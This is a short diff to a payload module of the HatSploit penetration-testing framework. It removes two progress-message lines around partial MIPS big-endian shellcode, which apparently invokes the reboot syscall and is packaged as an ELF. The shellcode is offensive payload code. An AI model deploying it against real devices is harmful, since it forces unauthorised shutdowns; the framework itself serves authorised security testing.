@@ -28,7 +28,6 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     def run(self):
-        self.output_process("Generating shellcode...")
         shellcode = (
             b"\x3c\x06\x43\x21"  # lui     a2,0x4321
             b"\x34\xc6\xfe\xdc"  # ori     a2,a2,0xfedc
@@ -40,7 +39,5 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x01\x01\x01\x0c"  # syscall 0x40404
         )
 
-        self.output_process("Generating payload...")
         payload = self.generate('elf', 'mipsbe', shellcode)
-
         return payload
